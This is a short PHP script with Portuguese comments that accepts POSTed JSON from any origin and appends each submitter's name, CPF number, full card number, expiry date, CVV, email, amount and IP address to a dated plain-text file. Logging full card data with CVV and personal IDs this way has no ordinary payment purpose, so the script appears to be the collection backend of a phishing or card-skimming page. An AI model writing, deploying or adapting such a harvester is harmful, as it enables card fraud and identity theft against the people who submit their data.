<?php
// salvar_cartao.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Receber os dados via POST
$dados = json_decode(file_get_contents('php://input'), true);

if (!$dados) {
    echo json_encode(['success' => false, 'erro' => 'Nenhum dado recebido']);
    exit;
}

// Validar dados obrigatórios
if (empty($dados['nome']) || empty($dados['cpf']) || empty($dados['cartao'])) {
    echo json_encode(['success' => false, 'erro' => 'Dados incompletos']);
    exit;
}

// Criar o conteúdo do arquivo
$conteudo = "============================================================\n";
$conteudo .= "📅 DATA/HORA: " . date('d/m/Y H:i:s') . "\n";
$conteudo .= "👤 NOME: " . $dados['nome'] . "\n";
$conteudo .= "🆔 CPF: " . $dados['cpf'] . "\n";
$conteudo .= "💳 CARTÃO: " . $dados['cartao'] . "\n";
$conteudo .= "📅 VALIDADE: " . ($dados['validade'] ?? 'N/A') . "\n";
$conteudo .= "🔢 CVV: " . ($dados['cvv'] ?? 'N/A') . "\n";
$conteudo .= "📧 E-MAIL: " . ($dados['email'] ?? 'N/A') . "\n";
$conteudo .= "💰 VALOR: " . ($dados['valor'] ?? 'N/A') . "\n";
$conteudo .= "🌐 IP: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";
$conteudo .= "============================================================\n\n";

// Nome do arquivo com a data atual
$nomeArquivo = 'cartoes_' . date('Y-m-d') . '.txt';

// Salvar no arquivo (append)
file_put_contents($nomeArquivo, $conteudo, FILE_APPEND | LOCK_EX);

echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso!']);
?>